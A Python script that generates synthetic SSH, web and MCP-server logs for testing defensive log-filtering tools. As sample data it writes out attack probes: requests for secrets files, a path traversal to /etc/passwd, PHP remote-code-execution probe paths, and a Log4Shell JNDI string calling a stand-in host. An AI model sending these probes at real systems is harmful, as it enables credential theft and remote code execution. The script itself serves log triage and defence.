#!/usr/bin/env python3
"""Generate synthetic log sample datasets for exercising the dun log-filter
reference hosts (hosts/python-logfilter, hosts/lua-logfilter).

ALL DATA IS SYNTHETIC. The IP addresses, hostnames, usernames, and requests
are illustrative values produced by this script; they do not correspond to any
real host, person, or event. The datasets exist for one purpose: to give a
defensive log-analysis workflow (filtering and triage in the editor) something
realistic to work on. Nothing here is an attack tool — these are the logs a
*target* accumulates, used to study and defend against scanning.

Deterministic: a fixed seed makes the committed .log files stable. Re-run to
regenerate, or pass --scale N to multiply the volume (N=30 approximates a busy
month). None of this is part of the editor build, the workspace, or the size
budget.

    hosts/sample-logs/generate.py            # regenerate the committed set
    hosts/sample-logs/generate.py --scale 30 # a month-sized run
"""

import argparse
import datetime as dt
import json
import random

SEED = 20260719
MONTH_START = dt.datetime(2026, 6, 1, tzinfo=dt.timezone.utc)
MONTH_DAYS = 30
HOST = "probe-vm"

# Synthetic attacker source pools: (network /24 prefix, ASN/region label used
# only in this comment and the README, relative frequency weight). Prolific
# botnet-style sources recur; long-tail sources appear once or twice.
ATTACKER_NETS = [
    ("61.177.173", "CN-Telecom", 9),
    ("218.92.0", "CN-Unicom", 8),
    ("222.186.30", "CN-South", 7),
    ("193.32.162", "RU-hosting", 6),
    ("45.134.22", "EU-VPS", 6),
    ("141.98.10", "LT-hosting", 5),
    ("92.63.197", "RU-scan", 5),
    ("185.220.101", "Tor-exit", 4),
    ("89.248.165", "NL-scan", 5),
    ("212.70.149", "BG-hosting", 4),
    ("103.145.13", "APAC-VPS", 3),
    ("5.188.206", "RU-hosting", 4),
    ("167.99.15", "US-cloud", 3),
    ("179.43.175", "PA-vpn", 2),
    ("80.94.92", "SC-scan", 3),
    ("34.116.200", "US-cloud", 2),
    ("94.102.51", "NL-scan", 3),
]

# Usernames tried, most-probed first.
SSH_USERS = [
    "root", "root", "root", "admin", "admin", "test", "user", "oracle",
    "postgres", "ubuntu", "guest", "ftp", "git", "mysql", "pi", "hadoop",
    "deploy", "www", "nagios", "ansible", "jenkins", "dev", "support",
]

# Diurnal weight per UTC hour: two scanning peaks (an APAC-evening surge and a
# late-UTC botnet window) over a quieter daytime baseline. Filtering by hour
# should show the distribution.
HOUR_WEIGHTS = [
    9, 11, 12, 10, 7, 5, 4, 3, 3, 3, 4, 4,
    4, 5, 5, 6, 6, 7, 8, 9, 10, 11, 10, 9,
]

MCP_METHODS = [
    "initialize", "tools/list", "tools/call", "resources/list",
    "resources/read", "prompts/list", "ping",
]

# Sniffer probe paths and the class each falls in (for README triage guidance).
PROBE_PATHS = [
    ("/.env", "secrets"),
    ("/.git/config", "secrets"),
    ("/.aws/credentials", "secrets"),
    ("/config.json", "secrets"),
    ("/wp-login.php", "cms"),
    ("/wp-admin/", "cms"),
    ("/administrator/", "cms"),
    ("/phpmyadmin/", "admin"),
    ("/admin/", "admin"),
    ("/actuator/env", "spring"),
    ("/server-status", "apache"),
    ("/.git/HEAD", "secrets"),
    ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "rce"),
    ("/cgi-bin/../../../../etc/passwd", "traversal"),
    ("/index.php?s=/index/\\think\\app/invokefunction", "rce"),
]

SCANNER_UAS = [
    "Mozilla/5.0 zgrab/0.x",
    "masscan/1.3",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "curl/7.88.1",
    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
    "Mozlila/5.0 (compatible; scanbot)",
    "${jndi:ldap://scan.example/a}",  # log4shell probe smuggled in the UA
]

LEGIT_MCP_IPS = ["10.20.0.14", "10.20.0.15", "198.51.100.23"]  # RFC5737 doc IP
LEGIT_UA = "mcp-client/0.4 (+https://example.internal)"


def ip_from(prefix, rng):
    return f"{prefix}.{rng.randint(1, 254)}"


def weighted_hour(rng):
    return rng.choices(range(24), weights=HOUR_WEIGHTS, k=1)[0]


def session_times(rng, count):
    """A burst: a random day, a weighted hour, then `count` timestamps a few
    seconds apart."""
    day = rng.randint(0, MONTH_DAYS - 1)
    start = MONTH_START + dt.timedelta(
        days=day, hours=weighted_hour(rng), minutes=rng.randint(0, 59), seconds=rng.randint(0, 59)
    )
    t = start
    out = []
    for _ in range(count):
        out.append(t)
        t += dt.timedelta(seconds=rng.randint(1, 9))
    return out


def gen_ssh_bruteforce(rng, sessions):
    """SSH auth log (syslog format) of brute-force / scan sessions, with a few
    legitimate key logins mixed in."""
    lines = []
    nets = [n for n in ATTACKER_NETS]
    weights = [n[2] for n in nets]
    for _ in range(sessions):
        prefix, _label, _w = rng.choices(nets, weights=weights, k=1)[0]
        ip = ip_from(prefix, rng)
        attempts = rng.randint(3, 18)
        pid = rng.randint(1000, 65000)
        times = session_times(rng, attempts + 1)
        port = rng.randint(1024, 65000)
        for i in range(attempts):
            ts = times[i].strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1)
            user = rng.choice(SSH_USERS)
            port = rng.randint(1024, 65000)
            if user in ("root", "admin", "test", "user"):
                lines.append(
                    (times[i], f"{ts} {HOST} sshd[{pid}]: Failed password for {user} "
                               f"from {ip} port {port} ssh2")
                )
            else:
                lines.append(
                    (times[i], f"{ts} {HOST} sshd[{pid}]: Invalid user {user} from {ip} port {port}")
                )
                lines.append(
                    (times[i], f"{ts} {HOST} sshd[{pid}]: Failed password for invalid user "
                               f"{user} from {ip} port {port} ssh2")
                )
        closing = times[attempts]
        cts = closing.strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1)
        lines.append((closing, f"{cts} {HOST} sshd[{pid}]: Connection closed by {ip} "
                               f"port {port} [preauth]"))
    # A handful of genuine key logins from an operator, so a filter has a
    # signal-vs-noise contrast to find.
    for _ in range(max(2, sessions // 40)):
        t = session_times(rng, 1)[0]
        ts = t.strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1)
        pid = rng.randint(1000, 65000)
        lines.append((t, f"{ts} {HOST} sshd[{pid}]: Accepted publickey for deploy "
                         f"from 198.51.100.7 port {rng.randint(40000, 60000)} ssh2: ED25519 SHA256:xK9"))
    lines.sort(key=lambda pair: pair[0])
    return [line for _t, line in lines]


def gen_mcp_probes(rng, sessions):
    """Access log for an exposed MCP server, in `<ts> IP - "METHOD path HTTP"
    status size "ua"` form so a fail2ban failregex anchored on `<HOST> - "..."`
    can match it. Legitimate traffic hits the allow-listed endpoints (bare `/`,
    `/mcp`, `/oauth`, `/.well-known`, `/favicon.ico`) and *sometimes* gets a 4xx
    (a failed token, an unauthenticated /mcp, a missing favicon) that must NOT be
    banned; scanners hit everything else and get 401/403/404 — the ban signal.
    The mix is what forces an allow-list (negative-lookahead) rule rather than a
    naive "ban all 4xx"."""
    lines = []
    nets = ATTACKER_NETS
    weights = [n[2] for n in nets]

    def emit(t, ip, method, path, status, ua):
        iso = t.strftime("%Y-%m-%dT%H:%M:%SZ")
        size = rng.randint(120, 4000) if status < 400 else 0
        lines.append((t, f'{iso} {ip} - "{method} {path} HTTP/1.1" {status} {size} "{ua}"'))

    # Legitimate MCP clients: discover .well-known, run the OAuth dance, then
    # use /mcp. A few steps legitimately 4xx yet sit on allow-listed paths.
    for _ in range(max(4, sessions // 6)):
        ip = rng.choice(LEGIT_MCP_IPS)
        times = session_times(rng, rng.randint(6, 14))
        seq = [
            ("GET", "/.well-known/oauth-protected-resource", 200),
            ("GET", "/.well-known/oauth-authorization-server", 200),
            ("GET", "/oauth/authorize?response_type=code&client_id=mcp", 302),
            ("POST", "/oauth/token", rng.choice([200, 200, 200, 401])),
        ]
        i = 0
        for method, path, status in seq:
            if i >= len(times):
                break
            emit(times[i], ip, method, path, status, LEGIT_UA)
            i += 1
        while i < len(times):
            status = 401 if rng.random() < 0.15 else 200  # unauth /mcp: allow-listed, not banned
            emit(times[i], ip, "POST", "/mcp", status, LEGIT_UA)
            i += 1

    # Ordinary browsers: the bare root and a missing favicon (a 404 that must
    # not be banned because /favicon.ico is allow-listed).
    for _ in range(max(3, sessions // 8)):
        prefix, _label, _w = rng.choices(nets, weights=weights, k=1)[0]
        ip = ip_from(prefix, rng)
        t = session_times(rng, 1)[0]
        emit(t, ip, "GET", "/", rng.choice([200, 200, 302]), "Mozilla/5.0 (compatible)")
        emit(t + dt.timedelta(seconds=1), ip, "GET", "/favicon.ico", 404, "Mozilla/5.0 (compatible)")

    # Scanner / sniffer sessions: non-allow-listed paths, 401/403/404.
    for _ in range(sessions):
        prefix, _label, _w = rng.choices(nets, weights=weights, k=1)[0]
        ip = ip_from(prefix, rng)
        ua = rng.choice(SCANNER_UAS)
        probes = rng.randint(2, 9)
        times = session_times(rng, probes)
        for i in range(probes):
            path, _cls = rng.choice(PROBE_PATHS)
            method = rng.choice(["GET", "GET", "GET", "POST", "HEAD"])
            status = rng.choice([404, 404, 404, 403, 401])
            emit(times[i], ip, method, path, status, ua)

    lines.sort(key=lambda pair: pair[0])
    return [line for _t, line in lines]


def gen_app_levels(rng, count):
    mods = ["auth", "db", "cache", "http", "worker", "scheduler"]
    levels = ["INFO"] * 8 + ["WARN"] * 3 + ["ERROR"] * 2 + ["DEBUG"] * 4
    msgs = {
        "INFO": ["request handled", "connection established", "job started", "cache hit"],
        "WARN": ["slow query 1.8s", "retrying upstream", "cache miss storm", "pool near limit"],
        "ERROR": ["connection refused", "deadlock detected", "timeout after 30s", "500 from upstream"],
        "DEBUG": ["entering handler", "payload decoded", "lock acquired", "span closed"],
    }
    out = []
    t = MONTH_START
    for _ in range(count):
        t += dt.timedelta(seconds=rng.randint(1, 40))
        level = rng.choice(levels)
        mod = rng.choice(mods)
        iso = t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{rng.randint(0, 999):03d}Z"
        out.append(f"{iso} {level:5s} {mod}: {rng.choice(msgs[level])}")
    return out


def gen_access(rng, count):
    ips = [ip_from(n[0], rng) for n in ATTACKER_NETS] + LEGIT_MCP_IPS
    paths = ["/", "/index.html", "/api/v1/users", "/api/v1/orders", "/static/app.js",
             "/favicon.ico", "/login", "/health", "/wp-login.php", "/.env"]
    out = []
    t = MONTH_START
    for _ in range(count):
        t += dt.timedelta(seconds=rng.randint(1, 20))
        ip = rng.choice(ips)
        path = rng.choice(paths)
        method = rng.choice(["GET", "GET", "GET", "POST"])
        status = rng.choice([200, 200, 200, 304, 404, 500, 301])
        size = rng.randint(0, 8000)
        stamp = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        out.append(f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} {size}')
    return out


def gen_jsonl(rng, count):
    levels = ["info"] * 7 + ["warn"] * 2 + ["error"] * 2
    out = []
    t = MONTH_START
    for _ in range(count):
        t += dt.timedelta(seconds=rng.randint(1, 30))
        level = rng.choice(levels)
        rec = {
            "ts": t.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "level": level,
            "svc": rng.choice(["api", "worker", "auth"]),
            "msg": rng.choice(["ok", "retry", "failed", "queued"]),
            "latency_ms": rng.randint(1, 4000),
        }
        out.append(json.dumps(rec, separators=(",", ":")))
    return out


def gen_stacktrace(rng):
    """A short app log where two requests fail with multi-line Java-style
    stack traces amid ordinary lines — exercises wide/multi-line filtering."""
    return [
        "2026-06-04T09:15:02Z INFO  http: GET /api/v1/checkout 200",
        "2026-06-04T09:15:03Z INFO  http: GET /api/v1/cart 200",
        "2026-06-04T09:15:04Z ERROR http: GET /api/v1/checkout 500",
        "java.lang.NullPointerException: Cannot invoke \"Order.total()\" because \"order\" is null",
        "\tat com.example.checkout.CheckoutService.finalize(CheckoutService.java:88)",
        "\tat com.example.checkout.CheckoutController.post(CheckoutController.java:42)",
        "\tat java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(Unknown Source)",
        "2026-06-04T09:15:05Z INFO  http: GET /health 200",
        "2026-06-04T09:15:10Z WARN  db: slow query 2.1s on orders",
        "2026-06-04T09:15:12Z ERROR worker: job 8831 failed",
        "org.postgresql.util.PSQLException: ERROR: deadlock detected",
        "\tat org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2725)",
        "\tat com.example.worker.OrderJob.run(OrderJob.java:57)",
        "2026-06-04T09:15:13Z INFO  worker: job 8832 started",
    ]


def write(name, lines):
    with open(name, "w", encoding="utf-8") as handle:
        handle.write("\n".join(lines) + "\n")
    print(f"{name}: {len(lines)} lines")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--scale", type=int, default=1,
                        help="multiply the session/line volume (30 ~= a month)")
    args = parser.parse_args()
    rng = random.Random(SEED)
    s = args.scale

    import os
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    write("ssh-bruteforce.log", gen_ssh_bruteforce(rng, 120 * s))
    write("mcp-probes.log", gen_mcp_probes(rng, 90 * s))
    write("app-levels.log", gen_app_levels(rng, 60 * s))
    write("access.log", gen_access(rng, 60 * s))
    write("app.jsonl", gen_jsonl(rng, 50 * s))
    write("stacktrace.log", gen_stacktrace(rng))


if __name__ == "__main__":
    main()
